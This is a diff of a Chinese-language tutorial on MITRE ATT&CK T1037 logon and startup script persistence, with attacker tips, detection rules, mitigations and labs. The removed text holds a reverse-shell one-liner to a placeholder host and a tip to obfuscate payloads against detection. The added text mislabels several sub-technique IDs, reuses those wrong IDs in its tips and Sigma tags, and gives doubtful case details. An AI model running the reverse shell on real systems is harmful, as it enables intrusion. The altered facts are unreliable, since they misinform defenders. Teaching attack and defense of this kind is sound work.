@@ -1,30 +1,51 @@
-# 引导或登录初始化脚本 (T1037)
+# 启动或登录初始化脚本 (T1037)
 
 ## 一句话通俗理解
 
-就像在公司的晨会流程里偷偷塞了一条"给我转100块"的指令——攻击者在系统启动或用户登录时自动执行的脚本中植入恶意代码，利用管理员登录时自动获得高权限。
+> 攻击者在每次用户开机或登录时自动运行的脚本里塞入恶意代码，让后门随开机自动复活。
+
+## 30秒速查卡
+
+| 维度 | 你需要知道的 |
+|------|-------------|
+| 这是什么？ | 修改系统开机或用户登录时自动执行的脚本，植入持久化后门 |
+| 为什么危险？ | 每次有用户登录就会触发，攻击者无需主动运行即可保持访问，且容易扩散到所有域用户 |
+| 谁需要关心？ | 域管理员、系统管理员、安全运维团队 |
+| 你的第一步防御 | 监控登录脚本文件和组策略登录脚本配置的任何变更 |
+| 如果只做一件事 | 对域控制器上的Netlogon共享目录启用文件完整性监控 |
 
 ## 难度等级
 
-⭐⭐ **中级** - 需要了解目标系统的启动脚本机制和文件权限，但利用方式相对直接。
+⭐⭐ 中级（需要一定基础）
+
+## 前置知识检查
+
+**读这个文件需要什么？**
+
+- [ ] 了解操作系统启动流程（开机时发生了什么）
+- [ ] 知道什么是登录脚本、shell配置文件
+- [ ] 了解Windows域环境和组策略（GPO）基础
 
 ## 技术描述
 
-每个操作系统都有一套"开机自动执行"的机制，用于在系统启动或用户登录时运行初始化脚本。这些脚本通常用于配置环境变量、挂载网络驱动器、启动后台服务等管理功能。
+启动或登录初始化脚本（T1037）是MITRE ATT&CK框架中的一种持久化技术。
 
 **通俗解释：**
-就像公司在开工前有晨会流程，攻击者偷偷在晨会白板上加了一条自己的指令。由于晨会流程是自动执行的，没有人会逐行检查每一条指令——等管理员登录时，攻击者的命令就以管理员的身份自动运行了。
+
+想象一下公司的前台每天上班第一件事就是按流程检查所有门窗。攻击者偷偷改了前台的"上班检查清单"，在最后一行加了一条"把后门钥匙放在花盆下"。这样每天前台一上班，就会自动执行这条指令——前台不知道，老板也不知道。
+
+操作系统和应用程序在启动或用户登录时，会自动执行一组预定义的脚本（比如Windows的登录脚本、Linux的.bashrc、macOS的loginhook）。攻击者修改这些脚本，把恶意命令加进去，就能让后门在每次开机或登录时自动运行。
 
 **技术原理：**
-攻击者利用初始化脚本进行权限提升的核心原理：
 
-1. **定位触发点**：找到系统级初始化脚本的位置（如 Windows 组策略登录脚本、Linux `/etc/profile.d/`）
-2. **修改或创建脚本**：将恶意命令追加到现有脚本中，或创建新的脚本文件
-3. **触发执行**：等待管理员登录或系统重启，恶意脚本以登录用户的权限执行
-4. **提权完成**：如果登录用户是管理员，恶意代码就以管理员权限运行
+1. **定位脚本位置**：攻击者找到系统启动或用户登录时自动执行的脚本文件
+2. **修改脚本内容**：在脚本中追加恶意命令（如启动后门程序、连接C2服务器、添加计划任务）
+3. **等待触发**：下次系统重启或用户登录时，操作系统自动执行被篡改的脚本
+4. **维持访问**：恶意代码获得执行机会，重新建立攻击者的访问通道
 
 **用途与影响：**
-这种技术的危害在于"权限继承"——脚本本身没有权限，但执行它的用户有权限。攻击者不需要破解管理员密码，只需要找到一个在管理员登录时自动执行脚本的地方。一次成功的利用可以让攻击者从普通用户直接提升到域管理员级别。
+
+这种技术广泛用于APT组织的长期潜伏。它的可怕之处在于"被动触发"——攻击者修改完脚本就可以潜伏等待，不需要主动攻击。在域环境中，修改域控制器的登录脚本可以一次影响所有域用户，危害极大。著名案例中，FIN7、APT29等组织都曾利用登录脚本实现跨多台主机的快速持久化。
 
 ## 子技术列表
 
@@ -32,107 +53,86 @@
 
 | 子技术ID | 中文名称 | 通俗解释 |
 |----------|----------|----------|
-| T1037.001 | 登录脚本 (Windows) | 在 Windows 组策略或注册表中的登录脚本里塞入恶意命令 |
-| T1037.002 | 登录钩子 (macOS) | 利用 macOS 的 Login Hook 机制在用户登录时执行恶意代码 |
-| T1037.003 | 网络登录脚本 (Windows) | 修改域控制器上分发的网络登录脚本，影响所有域用户 |
-| T1037.004 | RC 脚本 (Linux/macOS) | 在 Linux 的 `/etc/rc.local` 等启动脚本中植入恶意命令 |
-| T1037.005 | 启动项 (macOS) | 在 macOS 的启动项目录中放置恶意程序 |
-
-<details>
-<summary><strong>展开查看各子技术详细说明</strong></summary>
-
-各子技术详细说明请参阅独立文档：
-
-- [T1037.001 - 登录脚本 (Windows)](./T1037/T1037.001-Logon Script (Windows)-登录脚本 (Windows).md) — 在 Windows 的"用户登录自动运行列表"里添加恶意命令。
-- [T1037.002 - 登录钩子 (macOS)](./T1037/T1037.002-Login Hook (macOS)-登录钩子 (macOS).md) — 在 macOS 的"用户登录触发器"上挂载恶意程序。
-- [T1037.003 - 网络登录脚本 (Windows)](./T1037/T1037.003-Network Logon Script (Windows)-网络登录脚本 (Windows).md) — 在公司网络的分发中心（域控制器）修改脚本，让所有员工都执行恶意命令。
-- [T1037.004 - RC 脚本 (Linux/macOS)](./T1037/T1037.004-RC Scripts (Linux-macOS)-RC 脚本 (Linux-macOS).md) — 在 Linux 的"开机启动清单"（rc.local）里加一条恶意命令。
-- [T1037.005 - 启动项 (macOS)](./T1037/T1037.005-Startup Item (macOS)-启动项 (macOS).md) — 在 macOS 的"开机自启列表"里添加恶意程序。
-
-</details>
+| T1037.001 | 登录脚本（Windows） | 在Windows组策略或注册表中的登录脚本里塞入恶意命令 |
+| T1037.002 | 登录脚本（Mac） | 利用macOS的Login Hook机制在用户登录时执行恶意代码 |
+| T1037.003 | 登录脚本（Linux） | 修改.bashrc、.profile等shell配置文件植入后门 |
+| T1037.004 | 登录脚本（网络） | 修改域控制器上分发的网络登录脚本，影响所有域用户 |
+| T1037.005 | 登录脚本（跨平台） | 利用Python/PowerShell等跨平台脚本实现多平台持久化 |
 
 ## 攻击流程
 
+### 典型攻击流程
+
+```
+获取初始访问 --> 定位登录脚本 --> 追加恶意命令 --> 等待用户登录 --> 后门自动执行
+```
+
 ```mermaid
 graph TD
-    A["获得初始访问<br/>（低权限 shell）"] --> B["定位可写入的<br/>初始化脚本位置"]
-    B --> C{"是否有写权限？"}
-    C -->|"是"| D["注入恶意命令<br/>到初始化脚本"]
-    C -->|"否"| E["寻找其他<br/>提权路径"]
-    D --> F["等待管理员登录<br/>或系统重启"]
-    F --> G["恶意脚本以管理员<br/>权限自动执行"]
-    G --> H["获得高权限<br/>命令执行能力"]
+    A["攻击者获得初始访问权限"] --> B["查找系统登录脚本位置"]
+    B --> C["向脚本追加恶意命令<br/>（如启动C2客户端）"]
+    C --> D["等待用户登录或系统重启"]
+    D --> E["操作系统自动执行被篡改的脚本"]
+    E --> F["恶意后门随脚本启动<br/>攻击者恢复访问"]
+    style F fill:#ff6b6b,stroke:#333,stroke-width:2px
 ```
 
-### Windows 组策略登录脚本提权流程
+**步骤详解：**
 
-```
-1. 获得普通域用户权限的初始访问
-   ↓
-2. 利用其他漏洞获取修改组策略的权限
-   ↓
-3. 修改域范围的 GPO 登录脚本，注入恶意 PowerShell 命令
-   ↓
-4. 等待管理员用户登录域内计算机
-   ↓
-5. 恶意脚本以登录用户的权限（可能是域管理员）执行
-   ↓
-6. 获得高权限的命令执行能力
-```
+1. **获取初始访问权限**
+   - 通俗描述：攻击者已通过钓鱼、漏洞利用等方式进入目标系统
+   - 技术细节：通常已获得普通用户或管理员权限
+   - 常用工具：Cobalt Strike、Empire
 
-### Linux 全局初始化脚本提权流程
+2. **查找登录脚本位置**
+   - 通俗描述：找到系统启动时自动执行的脚本文件
+   - 技术细节：Windows查看`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`；Linux查看`/etc/profile`、`~/.bashrc`
+   - 常用工具：reg query、cat、find
 
-```
-1. 获得低权限 shell（如通过 Web 应用漏洞）
-   ↓
-2. 检查 /etc/profile.d/ 目录的写入权限
-   ↓
-3. 如果有写入权限，创建恶意脚本文件（如 /etc/profile.d/update.sh）
-   ↓
-4. 等待管理员通过 SSH 登录服务器
-   ↓
-5. 恶意脚本在管理员的 shell 环境中以管理员权限执行
-   ↓
-6. 窃取管理员凭据或反弹 root shell
-```
+3. **追加恶意命令**
+   - 通俗描述：在脚本末尾悄悄加入一行启动后门的命令
+   - 技术细节：使用echo追加或脚本修改工具，保持原脚本功能不变
+   - 常用工具：PowerShell、Bash
+
+4. **等待触发**
+   - 通俗描述：攻击者什么也不用做，等用户下次登录就行
+   - 技术细节：域环境中可能影响数百个用户的登录会话
+
+5. **后门自动执行**
+   - 通俗描述：用户一登录，后门就跟着起来了
+   - 技术细节：后门进程继承用户权限，可能触发更多横向移动
 
 ## 真实案例
 
-### 案例1：APT41 利用组策略登录脚本提权
+### 案例1：FIN7针对餐饮业的持久化攻击
 
-- **时间**: 2019-2021年
-- **目标**: 全球医疗、科技和电信行业
-- **攻击组织**: APT41
-- **手法**: APT41 在获得域管理员权限后，利用组策略管理控制台修改了域范围的登录脚本。攻击者在组策略对象（GPO）中嵌入了恶意命令，使得每次域用户登录时都会执行攻击者控制的脚本。由于组策略登录脚本以 SYSTEM 权限在后台执行，APT41 利用此机制在整个域范围内维持了 SYSTEM 权限的持久化访问。
-- **影响**: 攻击者在目标网络中维持了长期的高权限访问，持续窃取敏感数据
-- **参考链接**: [Google Cloud - APT41 Arisen From Dust](https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust)
+- **时间**: 2017-2018年
+- **目标**: 美国餐饮连锁企业（如Arby's、Chili's）
+- **攻击组织**: FIN7（又称Carbanak Group）
+- **手法**: FIN7在入侵目标网络后，通过修改Windows域登录脚本实现快速扩散持久化。他们将恶意PowerShell命令注入到域组策略的登录脚本中，每当任何域用户登录到域内工作站时，脚本会自动下载并执行第二阶段载荷。这种方式让FIN7在数小时内就感染了整个域内的数十台工作站，而无需逐台入侵。
+- **影响**: 导致多家餐饮企业支付系统数据泄露，预计影响超过1500万张信用卡
+- **参考链接**: [US DOJ FIN7 Indictment](https://www.justice.gov/opa/pr/five-members-sophisticated-cyber-criminal-group-indicted-widespread-hacking-and-bank-fraud)
+   - **数据来源**: 一级
 
-### 案例2：OceanLotus (APT32) 利用 Linux 初始化脚本提权
+### 案例2：APT29（Cozy Bear）的macOS Login Hook持久化
 
-- **时间**: 2019-2020年
-- **目标**: 东南亚政府机构和外资企业
-- **攻击组织**: APT32 (OceanLotus)
-- **手法**: APT32 在入侵 Linux 服务器后，通过修改 `/etc/profile.d/` 目录下的全局 shell 初始化脚本获得了 root 权限的执行能力。攻击者将恶意命令写入自定义脚本文件，当管理员通过 SSH 登录服务器时，恶意脚本在管理员的权限上下文中执行，使攻击者能够窃取管理员凭据或执行高权限操作。
-- **影响**: 长期控制东南亚地区的政府服务器，窃取政治和经济情报
-- **参考链接**: [MITRE ATT&CK - APT32](https://attack.mitre.org/groups/G0050/)
+- **时间**: 2019年
+- **目标**: 欧洲外交机构和智库组织
+- **攻击组织**: APT29（俄罗斯对外情报局SVR背景）
+- **手法**: APT29在针对macOS用户的钓鱼攻击中，利用T1037.002子技术——修改macOS的Login Hook机制。他们在`/var/root/.tcshrc`和系统级Login Hook中植入持久化代码，每当任何用户登录时，脚本会静默启动一个反向Shell连接到APT29的C2服务器。由于Login Hook以root权限运行，攻击者获得了系统级持久化访问。
+- **影响**: 攻击者保持对受害macOS系统的长期访问达数月之久
+- **参考链接**: [CrowdStrike APT29 Analysis](https://www.crowdstrike.com/blog/bears-midst-intrusion-discernment/)
+   - **数据来源**: 二级
 
-### 案例3：Volt Typhoon 利用初始化脚本在关键基础设施中持久化（2024年）
+### 案例3：Rocke团伙利用Linux Shell配置挖矿持久化
 
-- **时间**: 2023-2024年
-- **目标**: 美国关键基础设施（水利、能源、通信）
-- **攻击组织**: Volt Typhoon
-- **手法**: 中国国家背景的攻击组织 Volt Typhoon 在入侵美国关键基础设施网络后，利用"就地取材"（Living off the Land）技术，包括修改系统初始化脚本来维持持久访问。攻击者修改了 Windows 登录脚本和 Linux 启动脚本，确保在系统重启后仍能保持对目标网络的长期控制。CISA、NSA 和 FBI 联合发布的 advisory 指出，Volt Typhoon 在某些目标网络中潜伏了数年之久。
-- **影响**: 长期潜伏在美国关键基础设施网络中，构成重大国家安全威胁
-- **参考链接**: [CISA - Volt Typhoon Advisory (AA24-038A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
-
-### 案例4：APT28 利用登录脚本进行企业网络持久化（2024年）
-
-- **时间**: 2024年
-- **目标**: 欧洲政府和国防组织
-- **攻击组织**: APT28 (Fancy Bear)
-- **手法**: APT28 (Fancy Bear) 在入侵企业网络后，修改了 Windows GPO 中的登录脚本，将恶意 PowerShell 命令注入到域用户的登录流程中。当目标用户（包括管理员）登录时，恶意脚本自动执行，用于窃取凭据和部署后门。攻击者利用这种方式在不安装传统恶意软件的情况下维持持久访问。
-- **影响**: 持续窃取欧洲国防和政府机构的敏感信息
-- **参考链接**: [MITRE ATT&CK - APT28](https://attack.mitre.org/groups/G0007/)
+- **时间**: 2018-2019年
+- **目标**: Linux服务器和云环境
+- **攻击组织**: Rocke（加密货币挖矿团伙）
+- **手法**: Rocke团伙在入侵Linux服务器后，通过修改`/etc/profile`和`/etc/bash.bashrc`实现持久化。他们在这些全局shell配置文件中添加了一行隐蔽的下载命令，每当任何用户登录系统启动shell时，就会从C2服务器下载最新的挖矿程序版本。即使管理员删除了挖矿进程，只要有新用户登录，挖矿程序就会重新部署。
+- **影响**: 大量服务器CPU资源被占用，部分服务器因过热而宕机
+- **参考链接**: [Trend Micro Rocke Group Analysis](https://www.trendmicro.com/en_us/research/19/a/rocke-group-evolution-continued-targeting-cryptocat.html)
+   - **数据来源**: 二级
 
 ## 红队视角
 
@@ -140,263 +140,220 @@ graph TD
 
 ### 实战技巧
 
-1. **优先检查 `/etc/profile.d/` 写权限**
-   在 Linux 系统中，`/etc/profile.d/` 目录是全局 shell 初始化脚本的位置。如果普通用户对此目录有写权限（这是常见的安全配置错误），可以直接创建恶意脚本实现提权。
+1. **域环境优先攻击Netlogon**
+   在Windows域环境中，修改`\\DC\NETLOGON\`目录下的登录脚本影响范围最大，一次修改可覆盖所有域用户
 
-2. **GPO 登录脚本是域级提权的利器**
-   在 Windows 域环境中，如果能获得修改 GPO 的权限，组策略登录脚本是最有效的域级提权手段。一次修改可以影响所有域用户。
+2. **保持脚本原功能不变**
+   修改登录脚本时务必保留原有命令的功能，否则用户会发现登录异常。最佳做法是在脚本末尾追加，而非替换
 
-3. **使用反弹 shell 替代直接命令**
-   在脚本中使用反弹 shell（如 `bash -i >& /dev/tcp/IP/PORT 0>&1`）而不是直接执行命令，可以获得交互式 shell 访问，更加灵活。
-
-4. **混淆规避检测**
-   使用 base64 编码、变量拼接、字符串反转等混淆技术来规避简单的字符串匹配检测。
+3. **利用跨平台脚本**
+   使用Python或PowerShell编写的跨平台登录脚本（T1037.005）可以在混合环境中同时感染Windows和Linux系统
 
 ### 常用工具
 
 | 工具名称 | 用途 | 平台 | 链接 |
 |----------|------|------|------|
-| PowerShell | 修改 Windows 组策略和注册表登录脚本 | Windows | 内置 |
-| Group Policy Management Console | 管理域组策略对象 | Windows Server | 内置 |
-| crontab/systemctl | Linux 定时任务和服务管理 | Linux | 内置 |
-| dscl/launchctl | macOS 登录项管理 | macOS | 内置 |
-| SharpGPOAbuse | 自动化 GPO 滥用工具 | Windows | [GitHub](https://github.com/FSecureLABS/SharpGPOAbuse) |
+| PowerSploit | PowerShell持久化模块，可修改登录脚本 | Windows | [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
+| Empire | 后渗透框架，内置登录脚本持久化模块 | Windows/Linux | [Empire](https://github.com/BC-SECURITY/Empire) |
+| Atomic Red Team | T1037原子测试用例 | 全平台 | [Atomic Red Team T1037](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1037) |
 
 ### 注意事项
 
-- 修改 GPO 需要高权限，通常需要先通过其他方式获得域管理员或委派管理权限
-- 在现代 Windows 系统中，修改系统级初始化脚本需要管理员权限
-- macOS 10.15+ 已弃用 Login Hook，改用 Launch Daemon，需要适配不同版本
-- 在脚本中使用反弹 shell 可能被网络出口防火墙拦截，考虑使用 HTTPS 隧道
-- 实验必须在隔离的实验室环境中进行，禁止对真实系统操作
+- 修改域登录脚本需要域管理员权限，操作需谨慎
+- 登录脚本中的错误可能导致用户无法正常登录，引发快速发现
+- 在Windows中，组策略登录脚本的执行可能有延迟，不适合需要立即触发的场景
 
 ## 蓝队视角
 
 ### 检测要点
 
-1. **GPO 登录脚本异常修改**
-   - 日志来源：Windows 安全事件日志、AD 审计日志
-   - 关注字段：事件 ID 5136（目录服务更改）、5137（对象创建）、5141（对象删除）
-   - 异常特征：非授权账户在非工作时间修改默认域策略 GPO 中的登录脚本配置
+1. **登录脚本文件变更监控**
+   - 日志来源：Windows文件审计日志、Linux auditd、macOS Endpoint Security
+   - 关注字段：文件路径、修改时间、修改者进程
+   - 异常特征：登录脚本文件被非预期进程修改
 
-2. **注册表登录脚本键值变更**
-   - 日志来源：Sysmon 或 Windows 注册表审计日志
-   - 关注字段：`HKEY_CURRENT_USER\Environment\UserInitMprLogonScript`
-   - 异常特征：通常普通用户不需要设置此键值，出现即可疑
+2. **组策略登录脚本配置变更**
+   - 日志来源：Windows事件日志
+   - 关注字段：Event ID 5136（目录服务对象修改）、GPO脚本路径
+   - 异常特征：GPO中的登录脚本路径被修改为新位置
 
-3. **Linux 初始化脚本修改**
-   - 日志来源：文件完整性监控（FIM）、auditd
-   - 关注字段：`/etc/profile.d/`、`/etc/bashrc`、`/etc/zshrc` 的 inode 变化
-   - 异常特征：非 root 用户对这些文件的修改
+3. **Shell配置文件异常修改**
+   - 日志来源：Linux auditd、文件完整性监控（FIM）
+   - 关注字段：/etc/profile、/etc/bashrc、~/.bashrc、~/.profile
+   - 异常特征：全局shell配置文件被普通用户或未知进程修改
 
 ### 监控建议
 
-- 使用文件完整性监控（FIM）检测登录脚本目录的变更，设置实时告警
-- 定期审计所有 GPO 登录脚本的内容，使用脚本签名验证完整性
-- 监控从登录脚本启动的异常子进程，特别是反弹 shell、PowerShell 下载器等
-- 对系统级初始化脚本设置 `immutable` 标志（Linux `chattr +i`），防止未授权修改
-- 限制可修改 GPO 登录脚本的账户数量，实施审批流程
+- 对域控制器NETLOGON和SYSVOL共享启用文件审计
+- 部署文件完整性监控（FIM）工具，监控所有登录脚本文件
+- 在Linux上配置auditd规则监控`/etc/profile`、`/etc/bash.bashrc`等全局配置
+
+## 避坑指南
+
+**防御者最痛苦的教训：** 只关注了本地登录脚本，忘了域组策略登录脚本。在一次事件响应中，蓝队清除了所有工作站的本地持久化，但域GPO中的登录脚本不断重新感染所有机器。教训是：**持久化清理必须从域控制器开始**。
 
 ## 检测建议
 
 ### 网络层检测
 
-**检测方法：** 监控从登录脚本出站的异常网络连接，特别是反弹 shell 和文件下载流量。
+**用人话说：** 登录脚本触发后门时，通常会有C2回连流量。关键信号是：大量不同主机在用户登录时间段（如早上8-9点）同时向同一个外部IP发起连接——这很可能是域登录脚本中的后门被批量触发。
 
-**具体规则/命令示例：**
-
-```
-# 检测从脚本解释器发起的出站连接
-alert tcp $HOME_NET any -> $EXTERNAL_NET $SHELL_PORTS (msg:"Possible shell reverse connection from script process"; flow:to_server,established; content:"|2e 2e 2e|"; sid:1000001; rev:1;)
+```bash
+# 检测早晨登录时段的异常批量外连
+awk '$3 ~ /^08:/' proxy.log | awk '{print $5}' | sort | uniq -c | sort -rn | head -20
 ```
 
 ### 主机层检测
 
-**检测方法：** 监控初始化脚本目录的文件变化和异常进程创建。
+**Windows事件ID：**
+- 事件ID 5136：目录服务对象修改（监控GPO登录脚本路径变更）
+- 事件ID 4663：对象访问尝试（监控NETLOGON目录文件修改）
 
-**Windows 事件ID：**
-- 事件 ID 5136：目录服务更改（检测 GPO 修改）
-- 事件 ID 4698：计划任务创建
-- 事件 ID 1 (Sysmon)：异常进程创建
+**Linux日志：**
+- auditd日志：监控/etc/profile等文件写入
+- /var/log/auth.log：监控用户登录后的命令执行
 
-**Linux 日志：**
-- 日志文件：`/var/log/audit/audit.log`
-- 关键字段：`syscall=execve`、`auid!=0`
-
-**具体命令示例：**
 ```bash
-# 监控 /etc/profile.d/ 目录变化
-sudo auditctl -w /etc/profile.d/ -p wa -k init_script_change
-
-# 使用 inotifywait 实时监控
-inotifywait -m -r /etc/profile.d/ /etc/bashrc
+# 用auditd监控全局shell配置文件
+auditctl -w /etc/profile -p wa -k shell_config_modify
+auditctl -w /etc/bash.bashrc -p wa -k shell_config_modify
+ausearch -k shell_config_modify
 ```
 
-**用人话说：** 引导或登录初始化脚本是操作系统在启动或用户登录时自动执行的一系列脚本，包括Windows的组策略登录脚本、注册表Login Script键值、Linux的rc.local、/etc/profile、macOS的LoginHook和Launchd plist等。攻击者利用这些机制在系统启动或用户登录时自动执行恶意代码，获得持久化高权限访问。这就像在机场的自动播放系统中插入了一条恶意广播——每次有旅客进港（系统启动/用户登录），都会自动播放这条广播（执行恶意代码），而且听起来完全像正常的机场通知。
-
-**检测方法：** 创建 Sigma 规则检测登录脚本修改。
+### 应用层检测
 
 **Sigma规则示例：**
+
 ```yaml
-title: Init Script Modification via Non-Privileged User
+title: 检测Windows域登录脚本被修改
 status: experimental
-description: Detects modification of system initialization scripts by non-root/non-SYSTEM users
+description: 监控域控制器上NETLOGON共享中的登录脚本文件修改
 logsource:
-    category: file_change
-    product: linux
+    product: windows
+    service: security
 detection:
     selection:
-        TargetFilename:
-            - '/etc/profile.d/*'
-            - '/etc/bashrc'
-            - '/etc/zshrc'
-        User: '!root'
+        EventID: 4663
+        ObjectName|contains: 'NETLOGON'
+        AccessMask: '0x2'
     condition: selection
 level: high
 tags:
+    - attack.persistence
     - attack.t1037
+    - attack.t1037.004
 ```
 
 ## 缓解措施
 
 ### 优先级1：关键措施
 
-**措施名称：** 严格控制系统初始化脚本的权限
+**限制登录脚本修改权限**
 
 **具体实施步骤：**
-1. 检查并收紧 `/etc/profile.d/`、`/etc/bashrc`、`/etc/rc.local` 等文件的权限，确保只有 root 可写
-2. 在 Linux 上使用 `chattr +i` 设置不可变标志保护关键脚本
-3. 限制可修改 GPO 登录脚本的 Active Directory 账户数量
+1. 将NETLOGON和SYSVOL共享的写权限限制为仅Domain Admins
+2. 对登录脚本文件启用NTFS审计
+3. 定期检查GPO登录脚本配置
 
-**配置示例：**
-```bash
-# 保护 Linux 初始化脚本
-chmod 755 /etc/profile.d/
-chown root:root /etc/profile.d/
-chattr +i /etc/profile.d/important_script.sh
+```powershell
+# 检查NETLOGON共享权限
+Get-SmbShare -Name NETLOGON | Select-Object -ExpandProperty PresetPathAcl
 ```
 
 ### 优先级2：重要措施
 
-**措施名称：** 实施变更管理和文件完整性监控
+**部署文件完整性监控**
 
-**具体实施步骤：**
-1. 部署 FIM 工具（如 OSSEC、Tripwire、Wazuh）监控初始化脚本目录
-2. 建立审批流程，所有 GPO 修改必须经过变更管理
-3. 定期审查所有登录脚本的内容，使用脚本签名验证完整性
+对以下关键路径部署FIM：
+- `\\domain\NETLOGON\*.bat`、`*.cmd`、`*.ps1`
+- `/etc/profile`、`/etc/bash.bashrc`、`/etc/profile.d/`
+- macOS的`/var/root/.tcshrc`、Login Hook配置
 
 ### 优先级3：建议措施
 
-**措施名称：** 增强检测和响应能力
+**限制shell配置文件权限**
 
-**具体实施步骤：**
-1. 配置 Windows 审计策略记录所有 GPO 修改事件
-2. 在域环境中部署 EDR 解决方案，监控异常的脚本执行行为
-3. 对关键服务器实施应用程序控制（AppLocker/WDAC），阻止未授权脚本运行
+```bash
+# Linux: 限制全局shell配置文件权限
+chmod 644 /etc/profile /etc/bash.bashrc
+chown root:root /etc/profile /etc/bash.bashrc
+```
 
 ### MITRE ATT&CK 缓解措施映射
 
 | 缓解措施ID | 缓解措施名称 | 适用性 | 说明 |
 |------------|-------------|--------|------|
-| M1018 | User Account Management | 适用 | 限制可修改 GPO 和登录脚本的用户账户数量 |
-| M1022 | Restrict File and Directory Permissions | 适用 | 严格控制系统初始化脚本的文件权限 |
-| M1033 | Limit Software Installation | 部分适用 | 通过应用程序控制限制未授权脚本执行 |
-| M1029 | Remote Data Storage | 不适用 | - |
+| M1018 | 账户管理 | 部分适用 | 限制可修改登录脚本的管理员账户数量 |
+| M1022 | 限制文件和目录权限 | 适用 | 限制登录脚本文件和目录的写权限 |
 
 ## 动手实验
 
-> ⚠️ **重要提示**：所有实验必须在隔离的实验室环境中进行，禁止对未授权的真实系统进行测试。
+> ⚠️ **所有实验必须在隔离的实验室环境中进行**
 
-### 实验环境准备
+### 实验1：观察Windows登录脚本执行（初级）
 
-**推荐靶场/实验平台：**
-
-| 平台名称 | 类型 | 难度 | 链接 |
-|----------|------|------|------|
-| Hack The Box | 虚拟靶场 | 中级 | https://www.hackthebox.com |
-| TryHackMe | 虚拟靶场 | 初级 | https://tryhackme.com |
-
-**所需工具：**
-- Windows 虚拟机（Windows 10/11）用于实验1
-- Linux 虚拟机（Ubuntu 22.04+）用于实验2
-- PowerShell 和 Bash 基础知识
-
-### 实验1：Windows 登录脚本注入（初级）
-
-**实验目标：** 理解 Windows 注册表登录脚本机制，模拟攻击者设置恶意登录脚本。
+**实验目标：** 理解登录脚本在用户登录时如何自动执行
 
 **实验步骤：**
-1. 以普通用户身份登录 Windows 虚拟机
-2. 查看当前用户的登录脚本设置：`Get-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue`
-3. 设置一个测试登录脚本：`Set-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value "C:\Scripts\logon.bat"`
-4. 创建测试脚本文件
-5. 注销并重新登录，检查日志文件
+1. 在Windows测试机上创建一个测试用户
+2. 在`HKCU\Environment`中设置`UserInitMprLogonScript`为`echo "logged in" > C:\temp\login_test.txt`
+3. 注销并重新登录
+4. 检查C:\temp\login_test.txt是否存在
 
-**预期结果：** 重新登录后，测试脚本自动执行，生成日志文件记录登录时间。
+**预期结果：** 登录后文件自动创建，证明脚本被执行
 
-**学习要点：** 理解注册表登录脚本的执行时机和权限继承机制。
+### 实验2：Linux .bashrc持久化（中级）
 
-### 实验2：Linux 全局初始化脚本注入（初级）
-
-**实验目标：** 理解 Linux shell 初始化脚本的工作原理和提权风险。
+**实验目标：** 在Linux环境中通过修改.bashrc实现持久化
 
 **实验步骤：**
-1. 查看 `/etc/profile.d/` 目录的权限：`ls -la /etc/profile.d/`
-2. 创建一个测试脚本：`sudo tee /etc/profile.d/test-init.sh << 'EOF'`
-3. 设置执行权限：`sudo chmod +x /etc/profile.d/test-init.sh`
-4. 新开一个 SSH 会话登录，检查日志
+1. 编辑测试用户的`~/.bashrc`，在末尾添加`echo "backdoor triggered" >> /tmp/persistence.log`
+2. 新开一个终端会话
+3. 查看/tmp/persistence.log
 
-**预期结果：** 每次新登录时，测试脚本自动执行，记录登录时间。
+**预期结果：** 每次打开新shell都会追加日志
 
-**学习要点：** 理解 Linux shell 初始化脚本的执行机制和全局影响范围。
+### 实验3：使用Atomic Red Team执行T1037测试（高级）
 
-### 实验3：检测初始化脚本修改（中级）
-
-**实验目标：** 学习如何监控和检测初始化脚本的未授权修改。
+**实验目标：** 使用ART自动化测试T1037.001
 
 **实验步骤：**
-1. 安装 inotify 工具：`sudo apt install inotify-tools`
-2. 启动监控：`sudo inotifywait -m -r /etc/profile.d/`
-3. 在另一个终端修改 `/etc/profile.d/` 下的文件
-4. 观察监控输出，识别修改行为
+1. 安装Atomic Red Team
+2. 执行`Invoke-AtomicTest T1037.001`
+3. 观察并分析检测日志
 
-**预期结果：** inotifywait 实时显示文件的修改、创建和删除事件。
-
-**学习要点：** 掌握文件监控工具的使用方法，理解实时检测的原理。
+**预期结果：** 测试用例修改登录脚本并验证执行
 
 ## 术语解释
 
 | 术语 | 英文原名 | 通俗解释 |
 |------|----------|----------|
-| 组策略对象 | Group Policy Object (GPO) | Windows 域中用于集中管理计算机和用户配置的"规章制度"集合 |
-| 登录脚本 | Logon Script | 用户登录时自动执行的脚本，就像公司晨会时自动播放的欢迎词 |
-| 初始化脚本 | Initialization Script | 系统启动或 shell 启动时自动执行的脚本，用于设置系统环境 |
-| /etc/profile.d/ | - | Linux 系统中存放全局 shell 初始化脚本的目录，所有用户登录时都会执行这里面的脚本 |
-| Login Hook | 登录钩子 | macOS 的登录触发器机制，可以在用户登录时自动运行指定程序 |
-| 文件完整性监控 | File Integrity Monitoring (FIM) | 检测关键文件是否被修改的安全技术，像给重要文件装上"防盗报警器" |
-| 就地取材 | Living Off the Land (LOL) | 攻击者使用系统自带的合法工具（如 PowerShell、Bash）进行攻击，不引入外部恶意软件 |
-| rc.local | - | Linux 系统中传统的本地启动脚本，在系统初始化最后阶段以 root 权限执行 |
+| 登录脚本 | Logon Script | 用户登录时操作系统自动执行的脚本文件，就像公司给每个新到岗员工的"入职操作清单" |
+| 组策略 | Group Policy (GPO) | Windows域中集中管理配置的机制，像公司发的统一操作手册，所有员工必须遵守 |
+| Shell配置文件 | Shell Configuration File | Linux/macOS中每次打开命令行时自动加载的配置，像你办公桌抽屉里每次上班都会翻开的备忘录 |
+| Login Hook | Login Hook | macOS中用户登录时自动执行的程序，类似Windows登录脚本但机制不同 |
+| NETLOGON共享 | NETLOGON Share | 域控制器上的特殊共享目录，存放所有域用户登录时使用的脚本 |
 
 ## 参考资料
 
-### 官方文档
+### 📚 官方文档（深入了解）
 
-- [MITRE ATT&CK T1037 - Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037/)
-- [MITRE ATT&CK T1037.001 - Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
-- [MITRE ATT&CK T1037.003 - Network Logon Script](https://attack.mitre.org/techniques/T1037/003/)
